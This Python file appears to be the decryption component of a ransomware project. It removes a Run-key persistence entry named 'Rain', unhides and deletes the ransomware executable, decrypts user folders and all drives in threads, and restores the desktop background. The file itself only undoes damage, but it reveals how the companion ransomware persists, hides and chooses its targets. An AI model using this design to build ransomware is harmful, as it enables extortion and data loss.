from threading import Thread
from sys import argv
from os import chdir, system, remove
from os.path import expanduser
from decrypter import Decrypter
from util import drivers


def decrypt_all() -> None:
    """
    This function uses the list of possible paths for drivers connected to the machine from the "util"
    file to decrypt them (only available on Windows).
    """
    for drive in drivers:
        try:
            chdir(drive + '/')
            decrypter.decrypt_directory(drive)
        except FileNotFoundError:
            continue
        except PermissionError:
            continue


decrypter = Decrypter()

desktop = expanduser('~/Desktop')
documents = expanduser('~/Documents')
downloads = expanduser('~/Downloads')
onedrive = expanduser('~/OneDrive')

# Removing the created registry
exe = decrypter.delete_registry(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Rain')
decrypter.delete_registry(r'', 'WINDAT32_HOURS')

# These lines use system commands to show the ransomware file and remove it
# (placed in C:\Users\Public\filename.exe).
try:
    command = f'attrib -s -h {exe}'
    system(command)
    remove(exe)
    print('removido')
except PermissionError:
    pass
except FileNotFoundError:
	pass

# Instantiating Threads so that directories are decrypted simultaneously
d_desktop = Thread(target=decrypter.decrypt_directory, args=[desktop])
d_documents = Thread(target=decrypter.decrypt_directory, args=[documents])
d_downloads = Thread(target=decrypter.decrypt_directory, args=[downloads])
d_onedrive = Thread(target=decrypter.decrypt_directory, args=[onedrive])
d_all = Thread(target=decrypt_all)

decrypter.restore_background()

d_desktop.start()
d_documents.start()
d_downloads.start()
d_onedrive.start()
d_all.start()
